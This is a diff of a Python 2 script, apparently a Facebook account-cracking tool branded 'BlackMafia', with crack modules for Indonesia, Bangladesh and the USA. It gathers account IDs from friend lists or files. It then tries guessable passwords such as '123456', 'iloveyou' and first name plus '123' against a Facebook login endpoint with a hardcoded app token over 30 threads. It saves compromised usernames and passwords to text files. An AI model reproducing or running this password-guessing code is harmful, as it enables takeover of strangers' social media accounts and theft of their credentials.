-                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
-                                oke.close()
-                                oks.append(zowe)
-                            elif 'www.facebook.com' in ko['error_msg']:
-                                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
-                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
-                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
-                                cek = open('done/indo.txt', 'a')
-                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
-                                cek.close()
-                                cekpoint.append(zowe)
-                            else:
-                                bos6 = 'anjing'
-                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                                ko = json.load(data)
-                                if 'access_token' in ko:
-                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
-                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
-                                    oke = open('done/indo.txt', 'a')
-                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
-                                    oke.close()
-                                    oks.append(zowe)
-                                elif 'www.facebook.com' in ko['error_msg']:
-                                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
-                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
-                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
-                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
-                                    cek = open('done/indo.txt', 'a')
-                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
-                                    cek.close()
-                                    cekpoint.append(zowe)
-                                else:
-                                    bos7 = 'kontol'
-                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                                    ko = json.load(data)
-                                    if 'access_token' in ko:
-                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
-                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
-                                        oke = open('done/indo.txt', 'a')
-                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
-                                        oke.close()
-                                        oks.append(zowe)
-                                    elif 'www.facebook.com' in ko['error_msg']:
-                                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
-                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
-                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
-                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
-                                        cek = open('done/indo.txt', 'a')
-                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
-                                        cek.close()
-                                        cekpoint.append(zowe)
-                                    else:
-                                        bos8 = j['last_name'].lower() + '123'
-                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                                        ko = json.load(data)
-                                        if 'access_token' in ko:
-                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
-                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
-                                            oke = open('done/indo.txt', 'a')
-                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
-                                            oke.close()
-                                            oks.append(zowe)
-                                        elif 'www.facebook.com' in ko['error_msg']:
-                                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
-                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m' + j['name']
-                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
-                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
-                                            cek = open('done/indo.txt', 'a')
-                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
-                                            cek.close()
-                                            cekpoint.append(zowe)
-        except:
-            pass
-
-    p = ThreadPool(30)
-    p.map(main, id)
-    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80BlackMafia\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
-    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mFinished ...'
-    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
-    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92mdone/indo.txt'
-    print 50 * '\x1b[1;94m\xe2\x94\x80'
-    raw_input('\x1b[1;97m{<\x1b[1;93mBack\x1b[1;97m>}')
-    os.system('python2 lovehacker.py')
 
 
 def crack_bangla():
@@ -675,7 +340,7 @@ def crack_bangla():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Token invalid'
+        print '\033[1;91mToken invalid'
         os.system('rm -rf login.txt')
         time.sleep(1)
         keluar()
@@ -683,26 +348,26 @@ def crack_bangla():
     os.system('clear')
     print logo
     print 36 * '\x1b[1;94m\xe2\x96\x93'
-    print '\x1b[1;97m{\x1b[1;93m01\x1b[1;97m} Crack From Friend list'
-    print '\x1b[1;97m{\x1b[1;93m02\x1b[1;97m} Crack From Public Frendlist'
-    print '\x1b[1;97m{\x1b[1;93m03\x1b[1;97m} Crack From File'
-    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Back'
-    print 36 * '\x1b[1;94m\xe2\x96\x93'
+    print '01\x1b[1;97m Crack From Friend list'
+    print '2\x1b[1;97m Crack From Public Frendlist'
+    print '03\x1b[1;97m Crack From File'
+    print '00\x1b[1;97m  Back'
+    print 36 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
     pilih_bangla()
 
 
 def pilih_bangla():
-    teak = raw_input('\x1b[1;96mSlect Options \x1b[91m:\x1b[1;92m ')
+    teak = raw_input('\033[1;96mSlect Options \033[1;92m ')
     if teak == '':
-        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Fill Correctly !'
+        print '033[1;91m Fill Correctly !'
         pilih_bangla()
     else:
         if teak == '1' or teak == '01':
             os.system('clear')
             print logo
-            print 50 * '\x1b[1;94m\xe2\x94\x80'
-            print '             \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK BANGLADESH \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
-            print 50 * '\x1b[1;94m\xe2\x94\x80'
+            print 50 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
+            print '             033[1;94m Crack Bangladesh '
+            print 50 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
             r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
             z = json.loads(r.text)
             for s in z['data']:
@@ -711,20 +376,20 @@ def pilih_bangla():
         elif teak == '2' or teak == '02':
             os.system('clear')
             print logo
-            print 50 * '\x1b[1;94m\xe2\x94\x80'
-            print '             \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK BANGLADESH \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
-            print 50 * '\x1b[1;94m\xe2\x94\x80'
-            idb = raw_input('\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m ID Public/friend \x1b[1;91m:\x1b[1;92m ')
+            print 50 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
+            print '            033[1;95m  Crack Bangladesh '
+            print 50 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
+            idb = raw_input('033[1;92mID Public/friend : ')
             try:
                 pok = requests.get('https://graph.facebook.com/' + idb + '?access_token=' + toket)
                 sp = json.loads(pok.text)
-                print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Nama \x1b[1;91m:\x1b[1;92m ' + sp['name']
+                print '033[1;91m Name :' + sp['name']
             except KeyError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID public / friend does not exist !'
-                raw_input('\n\x1b[1;96m{\x1b[1;97m<Back>\x1b[1;96m}')
+                print '033[1;91m ID public / friend does not exist !'
+                raw_input('033[1;91m<Back>')
                 crack_bangla()
             except requests.exceptions.ConnectionError:
-                print '{!} No internet Conection!'
+                print '033[1;91m{!} No internet Conection!'
                 keluar()
 
             r = requests.get('https://graph.facebook.com/' + idb + '/friends?access_token=' + toket)
@@ -736,36 +401,36 @@ def pilih_bangla():
             os.system('clear')
             print logo
             try:
-                print 50 * '\x1b[1;94m\xe2\x94\x80'
-                print '             \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK BANGLADESH \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
-                print 50 * '\x1b[1;94m\xe2\x94\x80'
-                idlist = raw_input('\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Nama File \x1b[1;91m:\x1b[1;92m ')
+                print 50 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
+                print '             033[1;94m Crack Bangladesh'
+                print 50 * '｡☆✼★━━━━━━━━━━━━★✼☆｡'
+                idlist = raw_input('033[1;91mName File : ')
                 for line in open(idlist, 'r').readlines():
                     id.append(line.strip())
 
             except KeyError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File does not exist ! '
-                raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
+                print '033[1;91mFile does not exist ! '
+                raw_input('033[1;91mBack ')
             except IOError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File does not exist !'
-                raw_input('\n\x1b[1;96m{\x1b[1;97m<Back>\x1b[1;96m}')
+                print '033[1;91mFile does not exist ! '
+                raw_input('033[1;91mBack')
                 crack_bangla()
 
         elif teak == '0' or teak == '00':
             menu()
         else:
-            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Fill Correctly !'
+            print '033[1;91mFill Correctly !'
             pilih_bangla()
-        print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Total ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
-        print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Stop Tekan CTRL+Z'
+        print '033[1;95m Total Ids' + str(len(id))
+        print '033[1;94m Stop Process Press CTRL then Z'
         titik = ['.   ', '..  ', '... ']
         for o in titik:
-            print '\r\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Crack start ' + o,
+            print '033[1;96mCrack start ' + o,
             sys.stdout.flush()
             time.sleep(1)
 
-    print '\n\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mUse Airplane Mode If Nothing Is Working'
-    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80BlackMafia\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+    print '033[0;31m Use Vpn If Not Working'
+    print '033[0;32m Commands By Qaiser Abbas'
 
     def main(arg):
         sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
@@ -784,7 +449,7 @@ def pilih_bangla():
             ko = json.load(data)
             if 'access_token' in ko:
                 print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name   \x1b[1;91m    > \x1b[1;92m' + j['name']
                 print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                 print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                 oke = open('done/bangla.txt', 'a')
@@ -965,239 +630,6 @@ def pilih_bangla():
     print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;96mCP \x1b[1;96mfile Save \x1b[1;91m: \x1b[1;92mdone/bangla.txt'
     print 50 * '\x1b[1;94m\xe2\x94\x80'
     raw_input('\x1b[1;97m{<\x1b[1;96mBack\x1b[1;97m>}')
-    os.system('python2 lovehacker.py')
-
-
-def crack_usa():
-    global toket
-    os.system('clear')
-    try:
-        toket = open('login.txt', 'r').read()
-    except IOError:
-        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
-        os.system('rm -rf login.txt')
-        time.sleep(1)
-        keluar()
-
-    os.system('clear')
-    print logo
-    print 36 * '\x1b[1;94m\xe2\x96\x93'
-    print '\x1b[1;97m{\x1b[1;93m01\x1b[1;97m} Crack From Friend list'
-    print '\x1b[1;97m{\x1b[1;93m02\x1b[1;97m} Crack From Public Frendlist'
-    print '\x1b[1;97m{\x1b[1;93m03\x1b[1;97m} Crack From File'
-    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Back'
-    print 36 * '\x1b[1;94m\xe2\x96\x93'
-    pilih_usa()
-
-
-def pilih_usa():
-    teak = raw_input('\x1b[1;95mSlect Options \x1b[91m:\x1b[1;92m ')
-    if teak == '':
-        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Fill Correctly !'
-        pilih_usa()
-    else:
-        if teak == '1' or teak == '01':
-            os.system('clear')
-            print logo
-            print 36 * '\x1b[1;94m\xe2\x96\x93'
-            print '                \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK USA \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
-            print 36 * '\x1b[1;94m\xe2\x96\x93'
-            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
-            z = json.loads(r.text)
-            for s in z['data']:
-                id.append(s['id'])
-
-        elif teak == '2' or teak == '02':
-            os.system('clear')
-            print logo
-            print 50 * '\x1b[1;94m\xe2\x94\x80'
-            print '                \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK USA \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
-            print 50 * '\x1b[1;94m\xe2\x94\x80'
-            idt = raw_input('\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mID Public/Friend \x1b[1;91m:\x1b[1;92m ')
-            try:
-                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
-                op = json.loads(jok.text)
-                print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
-            except KeyError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID public / friend does not exist !'
-                raw_input('\n\x1b[1;95m[\x1b[1;97m<Back>\x1b[1;95m]')
-                crack_usa()
-            except requests.exceptions.ConnectionError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} No internet Conection !'
-                keluar()
-
-            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
-            z = json.loads(r.text)
-            for i in z['data']:
-                id.append(i['id'])
-
-        elif teak == '3' or teak == '03':
-            os.system('clear')
-            print logo
-            try:
-                print 50 * '\x1b[1;94m\xe2\x94\x80'
-                print '                \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK USA \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
-                print 50 * '\x1b[1;94m\xe2\x94\x80'
-                idlist = raw_input('\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mNama File\x1b[1;91m :\x1b[1;92m ')
-                for line in open(idlist, 'r').readlines():
-                    id.append(line.strip())
-
-            except KeyError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File does not exist! '
-                raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
-            except IOError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File does not exist !'
-                raw_input('\n\x1b[1;95m[\x1b[1;97m<Back>\x1b[1;95m]')
-                crack_usa()
-
-        elif teak == '0' or teak == '00':
-            menu()
-        else:
-            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Fill Correctly !'
-            pilih_usa()
-        print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
-        print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mStop Tekan CTRL+Z'
-        titik = ['.   ', '..  ', '... ']
-        for o in titik:
-            print '\r\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mCrack Start ' + o,
-            sys.stdout.flush()
-            time.sleep(1)
-
-    print '\n\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mUse Airplane Mode If Nothing Is Working'
-    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80BlackMafia\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
-
-    def main(arg):
-        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
-        sys.stdout.flush()
-        zowe = arg
-        try:
-            os.mkdir('done')
-        except OSError:
-            pass
-
-        try:
-            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
-            j = json.loads(an.text)
-            bos1 = 'iloveyou'
-            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-            ko = json.load(data)
-            if 'access_token' in ko:
-                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
-                oke = open('done/usa.txt', 'a')
-                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
-                oke.close()
-                oks.append(zowe)
-            elif 'www.facebook.com' in ko['error_msg']:
-                print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
-                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
-                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos1
-                cek = open('done/usa.txt', 'a')
-                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
-                cek.close()
-                cekpoint.append(zowe)
-            else:
-                bos2 = '123456'
-                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                ko = json.load(data)
-                if 'access_token' in ko:
-                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
-                    oke = open('done/usa.txt', 'a')
-                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
-                    oke.close()
-                    oks.append(zowe)
-                elif 'www.facebook.com' in ko['error_msg']:
-                    print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
-                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos2
-                    cek = open('done/usa.txt', 'a')
-                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
-                    cek.close()
-                    cekpoint.append(zowe)
-                else:
-                    bos3 = j['first_name'] + '123'
-                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                    ko = json.load(data)
-                    if 'access_token' in ko:
-                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
-                        oke = open('done/usa.txt', 'a')
-                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
-                        oke.close()
-                        oks.append(zowe)
-                    elif 'www.facebook.com' in ko['error_msg']:
-                        print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
